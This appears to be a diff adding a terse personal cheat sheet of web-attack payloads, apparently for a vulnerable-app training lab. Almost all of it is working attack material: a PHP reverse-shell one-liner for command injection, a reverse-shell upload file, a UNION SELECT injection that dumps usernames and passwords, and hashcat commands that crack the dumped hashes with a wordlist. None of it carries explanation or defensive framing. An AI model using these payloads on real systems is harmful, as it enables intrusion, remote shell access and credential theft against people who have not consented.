@@ -1,0 +1,17 @@
+Brute Force
+Burp Suite Sniper (Only Password enough).
+
+Command Injection
+php -r '$sock=fsockopen("127.0.0.1",4444);exec("sh <&3 >&3 2>&3");'
+
+File Upload
+php-reverse-shell.php
+
+SQL Injection
+?id=1' UNION SELECT user,password from users;-- -&Submit=Submit
+hashid <hash>
+hashcat -m 0 -a 0 <pass> /usr/share/wordlists/rockyou.txt
+
+
+
+
